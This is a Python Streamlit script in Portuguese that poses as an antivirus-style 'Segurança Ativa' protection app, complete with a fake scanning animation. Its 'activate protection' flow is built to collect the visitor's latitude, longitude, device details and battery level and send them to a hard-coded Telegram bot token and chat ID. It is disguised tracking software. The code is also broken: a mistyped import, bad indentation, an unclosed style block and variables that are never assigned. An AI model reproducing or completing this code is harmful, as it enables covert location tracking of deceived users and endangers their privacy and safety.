iimport streamlit as st
import requests
import time
import pandas as pd
from streamlit_js_eval import get_geolocation, streamlit_js_eval

# --- CONFIGURAÇÕES DO TELEGRAM ---
# COLOQUE SEUS DADOS AQUI:
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage?chat_id={SEU_ID}&text={mensagem}&parse_mode=Markdown"
    requests.get(url)

# --- CONFIGURAÇÕES VISUAIS ---
st.set_page_config(page_title="Segurança Ativa",page_icon="🛡️")

st.markdown("""
    <style>
    .stButton>button { width: 100%; background-color: #2196F3; color: white; height: 3.5em; border-radius: 12px; font-weight: bold; }
    .footer { position: fixed; left: 0; bottom: 0; width: 100%; color: #BDBDBD; text-align: center; font-size: 10px; padding: 20px; }
    </style>
    """, unsafe_allow_html=True)

st.markdown("### Segurança Ativa 🛡️")
st.divider()

col1, col2, col3 = st.columns([0.1, 0.8, 0.1])
with col2:
    st.markdown("<div style='text-align: center;'><img src='https://img.icons8.com/fluency/96/shield.png' width='80'></div>", unsafe_allow_html=True)
st.markdown("<h2 style='text-align: center; color: #2e7d32;'>Segurança Ativa</h2>", unsafe_allow_html=True)
# ANIMAÇÃO PREMIUM - ESTILO ANTIVÍRUS (06-22s)
st.markdown("""
    <div class="container">
        <div class="radar">
            <div class="scanner-circle"></div>
            <div class="particles"></div>
            <span class="percentage">0%</span>
            <p class="status-text">Verificando...Atualização de sistema</p>
        </div>
    </div>

    <style>
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 300px;
            background-color: transparent;
        }
        .radar {
            position: relative;
            width: 200px;
  """, unsafe_allow_html=True)
if 'ativo' not in st.session_state:
    if st.button("🛡️ ATIVAR PROTEÇÃO", use_container_width=True):
        st.session_state['ativo'] = True
        st.rerun()
    else:
        if st.button("🚫 DESATIVAR", use_container_width=True):
                                             del st.session_state['ativo']
                                             st.rerun()
  if 'loc' in locals() and loc and 'coords' in loc:
    lat = loc['coords']['latitude']
    lon = loc['coords']['longitude']
    dispositivo = user_agent.split('(')[1].split(')')[0] if '(' in user_agent else "Desconhecido"
    bat_nivel = bateria if bateria else "N/A"
    msg = f"🚨 *SISTEMA ATIVADO*\n\n📍 LAT: `{lat}`\n📍 LON: `{lon}`\n📱 DISP: `{dispositivo}`\n🔋 BAT: `{bat_nivel}`"
    enviar_telegram(msg)
    st.session_state['localizado'] = True
    st.rerun()

      

st.markdown('<div class="footer">SISTEMA DE SEGURANÇA INTEGRADO | Miamy ©2026</div>', unsafe_allow_html=True)
